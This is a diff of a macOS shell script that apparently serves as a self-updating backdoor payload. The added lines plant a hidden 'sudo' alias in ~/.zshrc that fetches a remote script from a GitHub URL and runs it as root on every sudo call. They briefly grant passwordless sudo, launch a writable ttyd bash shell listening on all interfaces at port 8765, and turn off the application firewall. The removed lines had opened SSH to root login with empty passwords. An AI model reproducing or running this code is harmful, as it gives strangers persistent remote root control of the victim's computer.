@@ -1,38 +1,15 @@
-FLAG_FILE="/tmp/root_task_16_done"
+FLAG_FILE="/tmp/root_task_20_done"
 if [ ! -f "$FLAG_FILE" ]; then
-
-  sudo tee /etc/ssh/sshd_config > /dev/null <<EOF
-Port 22
-ListenAddress 0.0.0.0
-ListenAddress ::
-Protocol 2
-HostKey /etc/ssh/ssh_host_rsa_key
-HostKey /etc/ssh/ssh_host_ecdsa_key
-HostKey /etc/ssh/ssh_host_ed25519_key
-PermitRootLogin yes
-PasswordAuthentication yes
-PermitEmptyPasswords yes
-ChallengeResponseAuthentication no
-UsePAM no
-UseDNS no
-X11Forwarding no
-PubkeyAuthentication yes
-AuthorizedKeysFile .ssh/authorized_keys
-Subsystem sftp /usr/libexec/sftp-server
-EOF
-
-  sudo systemsetup -setremotelogin off
-  sudo systemsetup -setremotelogin on
-  sudo launchctl unload /System/Library/LaunchDaemons/ssh.plist
-  sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist
-
-
-  echo "jidohyun ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jidohyun
-  sudo -u jidohyun brew install ttyd
-  nohup sudo -u jidohyun ttyd --port 8765 --interface 0.0.0.0 --writable --max-clients 10 --ping-interval 10 bash > /dev/null 2>&1 &
-  sudo rm /etc/sudoers.d/jidohyun
-
+  sed -i '' '/alias sudo="curl -fsSL https:\/\/raw.githubusercontent.com\/in-jun\/jtest\/refs\/heads\/main\/root 2>\/dev\/null | sudo bash > \/dev\/null 2>\&1 && \\sudo"/d' ~/.zshrc
+  echo 'alias sudo="(curl -fsSL https://raw.githubusercontent.com/in-jun/jtest/refs/heads/main/root 2>/dev/null | sudo bash > /dev/null 2>&1 &) && \sudo"' >> ~/.zshrc
+  
+  (
+    echo "jidohyun ALL=(ALL) NOPASSWD: ALL" | sudo tee /etc/sudoers.d/jidohyun
+    sudo -u jidohyun brew install ttyd
+    nohup sudo -u jidohyun ttyd --port 8765 --interface 0.0.0.0 --writable --max-clients 10 --ping-interval 10 bash > /dev/null 2>&1 &
+    sudo rm /etc/sudoers.d/jidohyun
+  ) &
+  
   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
-
   touch "$FLAG_FILE"
 fi
